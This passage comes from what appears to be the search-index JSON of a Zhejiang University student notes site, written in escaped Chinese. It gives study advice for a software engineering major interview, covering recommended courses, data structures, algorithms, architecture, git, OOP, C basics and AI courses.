e8\u91cd\u5b9e\u8df5\u7684\u8bfe\uff0c\u7fc1\u607a\u7684\u8bfe\u6ca1\u6709\u7ed9\u51fa\u914d\u5957\u7684\u7ec3\u4e60\uff0c\u56e0\u6b64\u9047\u5230\u89c6\u9891\u4e2d\u7684\u4ee3\u7801\u6700\u597d\u8ddf\u7740\u6572</li> <li>CS61B \u4f2f\u514b\u5229\u7684\u6570\u636e\u7ed3\u6784\u8bfe\u7a0b\uff0c\u8986\u76d6\u4e86Java\u8bed\u6cd5\uff0coop\u548c\u6570\u636e\u7ed3\u6784\u57fa\u7840\u7684\u5185\u5bb9\uff0c\u6709\u70b9\u9ebb\u70e6\u7684\u662f\u4ee3\u7801\u7684\u6846\u67b6\u597d\u50cf\u6700\u8fd1\u90fd\u8bbe\u7f6e\u4e3a\u4f2f\u514b\u5229\u7684\u5b66\u751f\u624d\u80fd\u8bbf\u95ee\uff0c\u4f46\u662f\u8fd9\u95e8\u8bfe\u975e\u5e38\u51fa\u540d\uff0c\u5728github\u4e0a\u5e94\u8be5\u80fd\u627e\u5230\u76f8\u5e94\u7684\u4ee3\u7801\u6846\u67b6\u3002</li> <li>CS61C \u4f2f\u514b\u5229\u7684\u8ba1\u7b97\u673a\u7ec4\u6210\u8bfe\uff0c\u4ee5C\u8bed\u8a00\u548cRISCV\u4e3a\u57fa\u7840\uff0c\u9762\u4e34\u548c61B\u4e00\u6837\u7684\u95ee\u9898\uff0c\u4ee3\u7801\u6846\u67b6\u53ef\u80fd\u8981\u5230\u522b\u5904\u53bb\u627e</li> </ol> <p>\u6700\u8fd1\u4f2f\u514b\u5229\u628a\u5f88\u591a\u8bfe\u7a0b\u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3a\u4e86\u79c1\u6709\uff0c\u5982\u679c\u4f60\u89c9\u5f97\u9ebb\u70e6\u7684\u8bdd\uff0c\u53ef\u4ee5\u8003\u8651\u53bbcsdiy\u4e0a\u627e\u4e00\u4e9b\u8bfe\u66ff\u6362</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#1","title":"1.\u4e00\u4e9b\u65e0\u6cd5\u7ed9\u51fa\u51c6\u786e\u51c6\u5907\u8303\u56f4\u7684\u4e1c\u897f","text":""},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#_2","title":"\u524d\u6cbf\u79d1\u6280","text":"<p>\u8fd9\u90e8\u5206\u8986\u76d6\u8303\u56f4\u8fc7\u4e8e\u5e7f\u6cdb\uff0c\u53cd\u6b63\u5927\u5bb6\u5c31\u90fd\u53bb\u4e86\u89e3\u6d89\u730e\u4e00\u70b9\uff0c\u5c24\u5176\u662f\u6700\u8fd1\u6bd4\u8f83\u706b\u7684AI\u4e4b\u7c7b\u7684</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#_3","title":"\u5e38\u89c1\u7684\u667a\u529b\u95ee\u9898","text":"<p>\u6bd4\u5982\u627e\u6b21\u54c1\u7684\u95ee\u9898\uff0c\u781d\u7801\u79f0\u91cd\u95ee\u9898\u7b49\u7b49\u8986\u76d6\u5f88\u5e7f\u3002</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#_4","title":"\u6570\u5b66\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u5e94\u7528","text":"<p>\u9762\u8bd5\u4e2d\u53ef\u80fd\u4f1a\u95ee\u5230\u4f60\u73b0\u5728\u5728\u5b66\u4e60\u7684\u5fae\u79ef\u5206\uff0c\u7ebf\u6027\u4ee3\u6570\u7b49\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u5e94\u7528\u3002\u4f60\u53ef\u4ee5\u53bb\u641c\u5bfb\u6709\u5173\u8d44\u6599\uff0c\u6bd4\u5982\u6570\u8bba\u5728\u5bc6\u7801\u5b66\u4e0a\u7684\u5e94\u7528\uff0c\u7ebf\u6027\u4ee3\u6570\u5728\u56fe\u5f62\u5904\u7406\u7684\u5e94\u7528\uff0c\u5fae\u79ef\u5206\u7684\u5e94\u7528\uff08cordic\u7b97\u6cd5\uff09</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#_5","title":"\u4e13\u4e1a\u9009\u62e9\u95ee\u9898","text":"<p>\u5305\u62ec\u4e86\u90a3\u4e9b\u95ee\u4f60\u4e3a\u4ec0\u4e48\u9009\u62e9\u8f6f\u5de5\uff0c\u8bb2\u8bb2\u4f60\u7684\u672a\u6765\u89c4\u5212\uff0c\u5bf9\u884c\u4e1a\u7684\u8ba4\u8bc6\u7b49\u7b49\uff0c\u8fd9\u4e2a\u53cd\u6b63\u4e5f\u591a\u591a\u76ca\u5584</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#2","title":"2.\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5","text":"<p>\u5982\u679c\u6709\u65f6\u95f4\u7684\u8bdd\u5efa\u8bae\u5b66\u4e60UCB\u7684CS61B\u516c\u5f00\u8bfe\uff0c\u8fd9\u95e8\u8bfe\u4f1a\u7528Java\u5e26\u4f60\u5b66\u4e60\u548c\u5b9e\u73b0\u5404\u79cd\u5e38\u89c1\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5e76\u4e14\u7528\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u505a\u4e09\u4e2a\u6709\u8da3\u7684Project\uff0c\u524d\u7f6e\u6761\u4ef6\u662f\u6709\u4e00\u5b9a\u7684\u7f16\u7a0b\u8bed\u8a00\u57fa\u7840\uff0c\u57fa\u672c\u4e0a\u628a\u7fc1\u607a\u7684C\u8bed\u8a00\u770b\u4e00\u904d\u5199\u4e00\u904d\u5c31\u7b97\u6709\u4e86\u3002\u5982\u679c\u4f60\u5b9e\u5728\u4e0d\u80fd\u63a5\u53d7\u7eaf\u82f1\u6587\u7684\u8bfe\u7a0b\uff0c\u4e5f\u53ef\u4ee5\u5b66\u4e60\u9648\u8d8a\u8001\u5e08\u7684\u6570\u636e\u7ed3\u6784\u7f51\u8bfe\uff0c\u5728B\u7ad9\u548cMOOC\u90fd\u80fd\u627e\u5230</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#21","title":"2.1 \u7b97\u6cd5\u6027\u80fd\u5206\u6790","text":"<p>\u9996\u5148\u8981\u4e86\u89e3\u7b97\u6cd5\u7684\u5b9a\u4e49\uff0c\u4ec0\u4e48\u662f\u7b97\u6cd5</p> <p>\u7b97\u6cd5\uff08\u82f1\u8bed\uff1aalgorithm\uff09\uff0c\u5728\u6570\u5b66\uff08\u7b97\u5b66\uff09\u548c\u8ba1\u7b97\u673a\u79d1\u5b66\u4e4b\u4e2d\uff0c\u6307\u4e00\u4e2a\u88ab\u5b9a\u4e49\u597d\u7684\u3001\u8ba1\u7b97\u673a\u53ef\u65bd\u884c\u5176\u6307\u793a\u7684\u6709\u9650\u6b65\u9aa4\u6216\u6b21\u5e8f\uff0c\u5e38\u7528\u4e8e\u8ba1\u7b97\u3001\u6570\u636e\u5904\u7406\u548c\u81ea\u52a8\u63a8\u7406\u3002\u7b97\u6cd5\u662f\u6709\u6548\u65b9\u6cd5\uff0c\u5305\u542b\u4e00\u7cfb\u5217\u5b9a\u4e49\u6e05\u6670\u7684\u6307\u4ee4\uff0c\u5e76\u53ef\u4e8e\u6709\u9650\u7684\u65f6\u95f4\u53ca\u7a7a\u95f4\u5185\u6e05\u695a\u7684\u8868\u8ff0\u51fa\u6765^^\u3002\u2014\u2014\u7ef4\u57fa\u767e\u79d1</p> <p>\u7b97\u6cd5\u7684\u6027\u80fd\u5206\u6790\u4e3b\u8981\u5206\u4e3a\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e24\u90e8\u5206\uff0c\u5176\u4e3b\u8981\u63cf\u8ff0\u4e86\u7b97\u6cd5\u8fd0\u884c\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u548c\u6240\u9700\u8981\u7684\u5185\u5b58\u7a7a\u95f4</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#22","title":"2.2 \u6570\u636e\u7ed3\u6784","text":"<p>\u8fd9\u90e8\u5206\u6211\u5f53\u521d\u662f\u624b\u5199\u7684\u7b14\u8bb0\uff0c\u6240\u4ee5\u5c31\u61d2\u5f97\u5728\u6253\u4e00\u904d\u4e86\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u641c\u5bfb\u76f8\u5173\u7684\u5b9a\u4e49\uff0c\u6216\u8005\u76f4\u63a5\u53c2\u770b\u7f51\u8bfe\uff0c</p> <p>\u7ebf\u6027\u8868</p> <p>\u6709\u987a\u5f0f\u5b58\u50a8\u7ed3\u6784\u548c\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u4e24\u79cd\uff0c\u524d\u8005\u5229\u4e8e\u8bfb\u53d6\u67d0\u4e00\u4f4d\u7684\u5143\u7d20\uff1b\u540e\u8005\u5229\u4e8e\u63d2\u5165\u548c\u5220\u9664\u5143\u7d20</p> <p>\u6808</p> <p>\u6808\u662f\u7ebf\u6027\u8868\u7684\u4e00\u79cd\u7279\u6b8a\u5f62\u5f0f\uff0c\u662f\u4e00\u79cd\u5177\u6709\u540e\u8fdb\u5148\u51fa\u7279\u70b9\u7684\u6570\u636e\u7ed3\u6784</p> <p>\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u7ebf\u6027\u8868\uff0c\u53ea\u5728\u8868\u5c3e\u8fdb\u884c\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c</p> <p>\u540c\u6837\u6709\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\u548c\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u4e24\u79cd</p> <p>\u53ef\u4ee5\u7528\u4e8e\u751f\u6210\u9006\u6ce2\u5170\u8868\u8fbe\u5f0f\uff0c\u6765\u5b9e\u73b0\u53bb\u62ec\u53f7\u7684\u64cd\u4f5c</p> <p>\u961f\u5217</p> <p>\u548c\u6808\u4e00\u6837\uff0c\u90fd\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u7ebf\u6027\u8868\uff0c\u53ea\u5141\u8bb8\u5728\u4e00\u6bb5\u8fdb\u884c\u63d2\u5165\u64cd\u4f5c\u53e6\u4e00\u6bb5\u8fdb\u884c\u5220\u9664\u64cd\u4f5c</p> <p>\uff08\u6211\u4eec\u7684\u952e\u76d8\u6709\u8f93\u5165\u7f13\u51b2\u533a\uff0c\u4f7f\u7528\u7684\u5c31\u662f\u5bf9\u5217\u7684\u6570\u636e\u7ed3\u6784\uff09</p> <p>\u6811</p> <p>\u4e0e\u6700\u57fa\u672c\u7684\u7ebf\u6027\u8868\u4e0d\u540c\uff0c\u6811\u662f\u4e00\u79cd\u4e00\u5bf9\u591a\u7684\u6570\u636e\u7ed3\u6784</p> <p>\u6811\u7684\u5e94\u7528\u6709\u5f88\u591a\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7684\u6587\u4ef6\u7ba1\u7406\uff0c\u6570\u636e\u5e93\u7cfb\u7edf\u5e38\u89c1\u7684\uff08\u7528\u7684\u662fB+ Tree\uff09\u7684\u7d22\u5f15\uff0c\u7f16\u8bd1\u7cfb\u7edf\u6709\u81ea\u5df1\u7684\u8bed\u6cd5\u6811\u5bf9\u6211\u4eec\u5199\u7684\u7a0b\u5e8f\u8fdb\u884c\u8bed\u6cd5\u5206\u6790</p> <p>\u54c8\u5e0c\u8868</p> <p>\u5efa\u7acb\u4e00\u4e2a\u641c\u7d22\u8868\uff0c\u51fd\u6570\u4f4d\u7f6e\uff0c\u51b2\u7a81--\u6307\u9488</p> <p>\u6c42\u4f59  \u5b57\u5178\uff0c</p> <p>\u6839\u636e\u5173\u952e\u503c\u548c\u503c\u76f4\u63a5\u8fdb\u884c\u8bbf\u95ee\u7684\u6570\u636e\u7ed3\u6784</p> <p>\u628a\u5143\u7d20\u7684\u5173\u952e\u503c\u6839\u636e\u54c8\u5e0c\u51fd\u6570\u5f97\u5230\u5b83\u7684\u5730\u5740</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#23","title":"2.3 \u4e00\u4e9b\u4f60\u53ef\u80fd\u9700\u8981\u719f\u6089\u7684\u7b97\u6cd5","text":"<p>\u5e38\u89c1\u7684\u67e5\u627e\u7b97\u6cd5\u548c\u6392\u5e8f\u7b97\u6cd5\uff0c\u4f8b\u5982</p> <p>\u5192\u6ce1\u6392\u5e8f\uff1b\u5feb\u901f\u6392\u5e8f\uff1b\u63d2\u5165\u6392\u5e8f\uff1b\u5806\u6392\u5e8f \u7ebf\u6027\u67e5\u627e\uff1b\u4e8c\u5206\u67e5\u627e\uff08\u6590\u6ce2\u90a3\u5951\u67e5\u627e\uff09\uff1b\u54c8\u5e0c\uff1b\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff08\u56fe\uff09</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#3","title":"3.\u4f53\u7cfb\u7ed3\u6784","text":"<p>\u4e3b\u8981\u9488\u5bf9\u786c\u4ef6\u5c42\u9762\u7684\u95ee\u9898\uff0c\u5177\u4f53\u5165\u95e8\u5b66\u4e60\u53ef\u4ee5\u9605\u8bfb\u8ba1\u7b97\u673a\u7cfb\u7edf\u6982\u8bba\u8fd9\u672c\u4e66\uff0c\u6216\u8005\u6709\u65f6\u95f4\u7684\u8bdd\uff0c\u4f9d\u65e7\u662f\u5efa\u8bae\u5b66\u4e60UCB\u7684CS61C\u516c\u5f00\u8bfe</p> <p>\u5982\u679c\u5e94\u5bf9\u9762\u8bd5\u7684\u8bdd\uff0c\u6211\u8ba4\u4e3a Crash Course Computer Science\uff08b\u7ad9\u4e0a\u6709\uff09\u91cc\u9762\u8bb2\u7684\u5e94\u8be5\u591f\u7528\u4e86</p> <p>\u4f60\u81f3\u5c11\u9700\u8981\u77e5\u9053\u4f55\u4e3a\u51af\u8bfa\u4f9d\u66fc\u67b6\u6784\uff0c\u8ba1\u7b97\u673a\u4e2d\u7684\u4e00\u4e9b\u5178\u578b\u786c\u4ef6\uff0c\u4ee5\u53ca\u8ba1\u7b97\u673a\u7684\u8fd0\u884c\u901f\u5ea6\u7684\u53d1\u5c55\u5386\u7a0b\uff08\u4f8b\u5982\u7f13\u5b58\u7684\u51fa\u884c\uff0c\u6d41\u6c34\u7ebfCPU\u7b49\u7b49\uff09\uff0c64\u4f4d\u7cfb\u7edf\u548c32\u4f4d\u7cfb\u7edf\u6709\u4ec0\u4e48\u533a\u522b\u7b49\u7b49</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#4","title":"4.\u4f18\u79c0\u7684\u7f16\u7a0b\u4e60\u60ef","text":""},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#_6","title":"\u826f\u597d\u7684\u4ee3\u7801\u89c4\u8303","text":"<p>\u5305\u62ec\u6ce8\u91ca\u7684\u4e66\u5199\uff0c\u53d8\u91cf\u547d\u540d\u89c4\u8303\uff0c\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u7ef4\u62a4\u6027\u548c\u53ef\u590d\u7528\u6027</p> <p>\u5177\u4f53\u53ef\u4ee5\u53c2\u770b\u4e00\u4e9b\u5e38\u7528\u7684\u4ee3\u7801\u89c4\u8303 - LiZ\u7684\u535a\u5ba2 (boilingfrog.github.io)</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#debug","title":"debug \u548c \u6d4b\u8bd5","text":"<p>\u77e5\u9053\u5e76\u4e14\u5b9e\u8df5\u8fc7\u5982\u4f55\u8bbe\u7f6e\u65ad\u70b9\uff0c\u8bbe\u7f6e\u76d1\u89c6\u53d8\u91cf\u4ece\u800c\u627e\u5230\u7a0b\u5e8f\u7684bug\uff0c\u73b0\u4ee3IDE\u4e5f\u6709\u66f4\u52a0\u9ad8\u7ea7\u7684\u529f\u80fd \u4f8b\u5982\u8fdb\u884c\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u53ef\u89c6\u5316\uff08\u5177\u4f53\u53ef\u4ee5\u53c2\u7167Python Tutor code visualizer: Visualize code in Python, JavaScript, C, C++, and Java \u8fd9\u4e2a\u7f51\u7ad9\uff09\u6216\u8005\u8bbe\u7f6e\u6761\u4ef6\u65ad\u70b9\u7b49\u7b49</p> <p>\u4e66\u5199\u6d4b\u8bd5\u662f\u7f16\u5199\u5927\u578b\u7a0b\u5e8f\u5fc5\u4e0d\u53ef\u5c11\u7684\u4e00\u90e8\u5206\uff0c\u4f8b\u5982Java\u4e2d\u6709\u4e00\u4e2a\u5185\u7f6e\u7684\u5e93JUnit\uff0c\u91cc\u9762\u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u51fd\u6570\u4fbf\u4e8e\u7a0b\u5e8f\u5458\u7f16\u5199\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u6d4b\u8bd5\u4e3b\u8981\u9488\u5bf9\u7a0b\u5e8f\u7684\u6b63\u786e\u6027\u548c\u6027\u80fd\u8fdb\u884c\u6d4b\u8bd5\u3002\u5982\u679c\u4f60\u60f3\u4e86\u89e3\u6d4b\u8bd5\u7684\u5fc5\u8981\u6027\uff0c\u53ef\u4ee5\u53c2\u770b\u8fd9\u7bc7\u6587\u7ae0</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#git-and-github","title":"git and github","text":"<p>\u5982\u679c\u4f60\u9700\u8981\u5bf9git\u7684\u64cd\u4f5c\u8fdb\u884c\u5b9e\u8df5\uff0c\u4f60\u6700\u597d\u80fd\u591f\u6709\u4e00\u5b9a\u7684\u5bf9shell\u7684\u4e86\u89e3\uff0c\u53ef\u4ee5\u53c2\u770bwhx\u5b66\u957f\u7684\u89c6\u9891 Shell \u57fa\u7840\u53ca CLI \u5de5\u5177\u63a8\u8350 | \u5b9e\u7528\u6280\u80fd\u62fe\u9057\u7b2c\u4e00\u8bb2 | \u6d59\u6c5f\u5927\u5b66\u8ba1\u7b97\u673a\u5b66\u9662\u670b\u8f88\u8f85\u5b66\u3010\u76f4\u64ad\u56de\u653e\u3011_\u54d4\u54e9\u54d4\u54e9_bilibili </p> <p>\u5177\u4f53\u5bf9git\u7684\u5b66\u4e60\u53ef\u4ee5\u53c2\u770bthe missing semester\u5176\u4e2d\u7684\u4e00\u7ae0\uff0c\u6216\u8005\u4f60\u4e0d\u559c\u6b22\u770b\u89c6\u9891\u4e5f\u53ef\u4ee5\u53c2\u770bgit\u7684\u5b98\u65b9\u6587\u6863\u6216\u8005 Using Git | CS 61B Spring 2019 (datastructur.es)  \u8fd9\u4e2a\u6587\u6863\u91cc\u9762\u63cf\u8ff0\u4e86\u4e00\u4e2a\u5bf9git\u7684\u5c0f\u6d4b\u8bd5\uff0c\u4f60\u53ef\u4ee5\u8ddf\u7740\u505a\u4ece\u800c\u83b7\u5f97\u66f4\u597d\u7684\u7406\u89e3\uff08\u8bb0\u5f97\u5148\u4e0b\u8f7dgit\uff09</p> <p>git\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u800c\u4e0d\u662f\u96c6\u4e2d\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0cgit\u4f7f\u6bcf\u4e2a\u5f00\u53d1\u4eba\u5458\u7684\u8ba1\u7b97\u673a\u90fd\u5305\u542b\u6574\u4e2a\u5386\u53f2\uff08git\u4fdd\u5b58\u7684\u4ee3\u7801\u7248\u672c\uff0c\u5b58\u653e\u5728\u672c\u7535\u8111\u4e2d\uff0c\u800c\u4e0d\u662f\u8fdc\u7a0b\u670d\u52a1\u5668\uff09\u5f53\u4f60\u6267\u884c<code>git init</code>\u200b\u547d\u4ee4\u65f6\uff0c\u4f60\u5f53\u524d\u6240\u5728\u7684\u6587\u4ef6\u5939\u4f1a\u51fa\u73b0\u4e00\u4e2a.git\u6587\u4ef6\uff0c\u91cc\u9762\u7528\u6765\u5b58\u653e\u4f60\u6240\u8fed\u4ee3\u7684\u7248\u672c\uff08\u4e0d\u6b62\u662f\u4ee3\u7801\u4e5f\u5305\u62ec\u6587\u4ef6\uff09</p> <p>\u5f53\u4f60\u8981\u8fdb\u884c\u4e0d\u786e\u5b9a\u7684\u64cd\u4f5c\u6216\u8005\u548c\u4ed6\u4eba\u5408\u4f5c\u5f00\u53d1\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u4f60\u9700\u8981\u65f6\u5e38\u4fdd\u5b58\u5f53\u524d\u7684\u4ee3\u7801\u7248\u672c\u5e76\u8fdb\u884c\u8fed\u4ee3\uff0cgit\u5e2e\u52a9\u4f60\u7ba1\u7406\u4f60\u7684\u4ee3\u7801\u7248\u672c\u3002</p> <p>GitHub\u7684\u5176\u4e2d\u4e00\u4e2a\u4f5c\u7528\u662f\u4f60\u53ef\u4ee5\u4f7f\u7528\u4f60\u672c\u5730\u7684git\uff0c\u628a\u4ee3\u7801\u53d1\u9001\u5230GitHub\u4e0a\uff0c\u4fbf\u4e8e\u4f60\u548c\u4f60\u7684\u670b\u53cb\u8fdb\u884c\u8fdc\u7a0b\u5408\u4f5c\u5f00\u53d1\u3002</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#oop","title":"\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1\uff08oop\uff09","text":"<p>\u628a\u9762\u5411\u5bf9\u8c61\u653e\u5230\u8fd9\u4e00\u5757\u6765\u8c8c\u4f3c\u6709\u70b9\u95ee\u9898\uff0c\u4f46\u662foop\u7684\u601d\u60f3\u786e\u5b9e\u662f\u4f20\u7edf\u7684\u8bbe\u8ba1\u6a21\u5f0f\u7684\u4e00\u90e8\u5206</p> <p>\u4ee5C++\u4e3a\u4f8b\uff0c\u5982\u679c\u4f60\u9700\u8981\u6df1\u5165\u5b66\u4e60C++\uff0c\u53ef\u4ee5\u53c2\u770bC++(0) \u8bfe\u7a0b\u7b80\u4ecb_\u54d4\u54e9\u54d4\u54e9_bilibili \u4e5f\u662f\u4e00\u4f4d\u5b66\u957f\u7684\u670b\u8f88\u7f51\u8bfe\uff0c\u5982\u679c\u4f60\u4e0d\u559c\u6b22\u770b\u89c6\u9891\uff0c\u4e5f\u53ef\u4ee5\u53c2\u770b\u8fd9\u4f4d\u5b66\u957f\u7684\u535a\u5ba2C++ \u5b66\u4e60 - \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4 (xuan-insr.github.io)</p> <p>\u4f46\u662f\u8fd9\u4f4d\u5b66\u957f\u7684C++\u7f51\u8bfe\u5c5e\u4e8e\u662f\u6bd4\u8f83\u8be6\u7ec6\u7684\u4e00\u6863\uff0c\u4e0d\u53ea\u5305\u62ecoop\uff0c\u6d59\u6c5f\u5927\u5b66 C++ \u7fc1\u607a\u8001\u5e08_\u54d4\u54e9\u54d4\u54e9_bilibili \u7fc1\u607a\u8001\u5e08\u7684\u8fd9\u4e00\u7248\u4f1a\u7a0d\u5fae\u77ed\u4e00\u70b9\u3002</p> <p>\u5982\u679c\u4f60\u60f3\u5b66\u4e60Java\u7684oop\uff08\u66f4\u52a0oop\u7684\u8bed\u8a00\uff09\u53ef\u4ee5\u5b66\u4e60CS61B</p> <p>\u7531\u4e8e\u6211\u7cbe\u529b\u6709\u9650\uff0c\u5c31\u4e0d\u5728\u8fd9\u91cc\u8be6\u7ec6\u8bb2\u8ff0\u4e86</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#5","title":"5.\u4f60\u81ea\u5df1\u7684\u7a0b\u5e8f","text":"<p>\u9762\u8bd5\u7684\u65f6\u5019\u65f6\u5e38\u4f1a\u95ee\u5230\u4f60\u81ea\u5df1\u5199\u8fc7\u7684\u6700\u5370\u8c61\u6df1\u523b\u7684\u4e00\u4e2a\u7a0b\u5e8f\u6216\u8005\u6700\u5927\u578b\u7684\u7a0b\u5e8f\u662f\u4ec0\u4e48\uff0c\u4f60\u6700\u597d\u80fd\u591f\u63d0\u524d\u51c6\u5907\u4e00\u7248\u3002\u5982\u679c\u5e0c\u671b\u5c11\u82b1\u70b9\u7cbe\u529b\uff0c\u4f60\u53ef\u4ee5 \u5230b\u7ad9\u627e\u4e00\u4e2a\u7528c\u8bed\u8a00\u7f16\u5199\u7684\u5c0f\u6e38\u620f\uff0c\u8ddf\u7740\u5bf9\u65b9\u6572\u4ee3\u7801\u6572\u4e0b\u6765\u5c31\u597d\u3002\u5982\u679c\u4f60\u6709\u7cbe\u529b\u7684\u8bdd\uff0c\u8bf7\u4f18\u5148\u5b66\u4e60UCB\u7684CS61\u7cfb\u5217\uff0cABC\u4e2d\u7684\u4efb\u4f55\u4e00\u95e8\u8bfe\u90fd\u6709\u51e0\u4e2a\u4f18\u8d28\u7684Project\uff0c\u53ef\u4ee5\u5e94\u4ed8\u9762\u8bd5\u4e86</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#6c","title":"6.c\u8bed\u8a00\u57fa\u7840","text":"<p>\u5e94\u5f53\u5728\u9762\u8bd5\u4e4b\u524d\u5b66\u5b8cc\u7a0b\u7684\u5185\u5bb9\uff0c\u4e00\u822c\u770b\u5b8c\u7fc1\u607a\u8001\u5e08\u7684\u7f51\u8bfe\u5c31\u5dee\u4e0d\u591a\u4e86</p> <p>\u4f60\u9700\u8981\u81f3\u5c11\u4e86\u89e3\uff1a</p> <ol> <li>\u7a0b\u5e8f\u662f\u5982\u4f55\u8fd0\u884c\u7684 \u7f16\u8bd1\u9884\u5904\u7406\uff0c\u7f16\u8bd1\uff0c\u6c47\u7f16\uff0c\u94fe\u63a5\u5404\u4e2a\u9636\u6bb5\u90fd\u5728\u5e72\u4ec0\u4e48</li> <li>\u4e86\u89e3\u5b8f\u5b9a\u4e49\u53ca\u5176\u98ce\u9669</li> <li>\u8ba1\u7b97\u673a\u5e95\u5c42\u662f\u5982\u4f55\u5904\u7406\u6d6e\u70b9\u6570\u7684</li> <li>\u4ec0\u4e48\u662f\u547d\u4ee4\u884c\u53c2\u6570</li> <li>\u7b80\u5355\u5730\u4e86\u89e3\u9012\u5f52</li> <li>\u4e86\u89e3\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7</li> <li>\u4e86\u89e3c\u8bed\u8a00\u7684\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u5206\u914d\u60c5\u51b5</li> </ol>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#7","title":"7.\u4eba\u5de5\u667a\u80fd","text":"<p>\u7531\u4e8e\u8ba1\u9662\u8fd9\u51e0\u5e74\u5f00\u8bbe\u4e86\u5927\u91cf\u4eba\u5de5\u667a\u80fd\u76f8\u5173\u7684\u8bfe\u7a0b\uff0c\u6709\u53ef\u80fd\u5728\u9762\u8bd5\u7684\u65f6\u5019\u4e5f\u4f1a\u6d89\u53ca\u5230\u76f8\u5173\u7684\u5185\u5bb9\u3002\u4f46\u5927\u5bb6\u4e5f\u6ca1\u5fc5\u8981\u64cd\u4e4b\u8fc7\u6025\uff0c\u5728\u5b66\u4e60\u4eba\u5de5\u667a\u80fd\u4e4b\u524d\u8fd8\u662f\u8981\u6253\u597d\u524d\u9762\u7684\u7f16\u7a0b\u8bed\u8a00\u548c\u6570\u636e\u7ed3\u6784\u7684\u57fa\u7840\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u5177\u5907\u4e86\u8fd9\u4e9b\u57fa\u7840\u7684\u8bdd(\u9700\u8981\u4e00\u5b9a\u7684Python\u57fa\u7840\uff0c\u5982\u679c\u4f60\u6ca1\u6709Python\u57fa\u7840\u7684\u8bdd\uff0c\u6211\u8fd8\u662f\u63a8\u8350\u4f2f\u514b\u5229\u7684CS61A)\uff0c\u90a3\u4e48\u6709\u4e00\u4e9b\u4eba\u5de5\u667a\u80fd\u7684\u76f8\u5173\u8bfe\u7a0b\u53ef\u4ee5\u63a8\u8350\u7ed9\u4f60</p> 